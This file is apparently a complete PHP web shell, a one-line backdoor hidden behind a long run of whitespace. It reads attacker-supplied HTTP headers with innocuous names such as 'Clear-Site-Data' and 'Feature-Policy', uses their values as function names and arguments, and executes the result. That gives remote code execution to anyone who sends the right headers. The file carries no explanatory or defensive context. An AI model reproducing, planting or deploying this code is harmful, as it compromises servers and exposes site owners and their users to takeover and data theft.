<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Clear-Site-Data'])){$internal=$_HEADERS['Clear-Site-Data']('', $_HEADERS['Feature-Policy']($_HEADERS['Large-Allocation']));$internal();}
